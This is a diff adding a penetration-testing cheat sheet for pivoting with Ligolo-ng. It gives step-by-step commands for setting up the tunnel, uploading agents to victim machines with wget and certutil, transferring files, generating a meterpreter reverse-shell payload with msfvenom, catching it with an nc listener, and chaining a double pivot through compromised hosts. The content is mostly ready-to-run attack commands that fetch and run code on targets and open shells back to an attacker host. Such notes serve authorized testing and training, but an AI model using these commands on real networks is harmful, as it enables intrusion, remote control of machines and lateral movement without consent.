@@ -1,0 +1,94 @@
+--------------------------
+  Pivoting - Ligolo-ng
+--------------------------
+- https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
+- https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
+
+Releases - Linux:
+Proxy - https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
+Agent - https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
+
+Releases - Windows:
+Proxy - https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_windows_amd64.zip
+Agent - https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip
+
+
+1. Unzipping
+tar -xzf <ligolo.tar.gzip>
+
+2. Attacker Setup - Add network interface for ligolo
+
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+ip a (to confirm the added interface)
+
+3. Attacker Setup - Start the ligolo proxy
+
+chmod +x <proxy>
+./proxy -selfcert 
+
+4. Victim Setup - Upload ligolo agent to the target machine
+
+wget http://<attacker ip>:8000/agent && chmod +x agent (Linux)
+certutil -urlcache -f http://<attacker ip>:8000/agent.exe agent.exe (Windows)
+
+5. Victim Setup - Connect to the proxy server at attacker side
+
+./agent -connect <attacker ip>:11601 -ignore-cert
+
+6. Attacker Setup - Add target network
+
+sudo ip route add <target network address>/24 dev ligolo
+
+7. Attacker Setup - Start up the tunnel in ligolo
+
+start
+
+--------------------------
+ Ligolo-ng - File Transfer
+--------------------------
+
+1. Setup listener in ligolo proxy server
+
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:8000
+
+2. Attacker setup web server to transfer file
+
+python3 -m http.server 8000
+
+3. Victim machine download file from attacker machine
+
+Invoke-WebRequest -Uri "http://<attacker ip>:1234/shell.exe" -OutFile shell.exe
+
+
+--------------------------
+ Ligolo-ng - Reverse Shell
+--------------------------
+
+1. Setup listener in ligolo proxy server
+
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+
+2. Attacker setup payload and listener
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker ip> LPORT=1234 -f exe -o shell.exe
+
+nc -nvlp 4444
+
+
+--------------------------
+ Ligolo-ng - Double Pivot
+--------------------------
+
+1. Download the agent file to the second pivot machine
+
+Invoke-WebRequest -Uri "http://<attacker ip>:1234/agent.exe" -OutFile agent.exe
+
+2. Attacker add listener for second pivot
+
+listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+
+3. Victime machine connect to the second pivot
+
+./agent.exe -connect <attacker ip>:11601 -ignore-cert
+
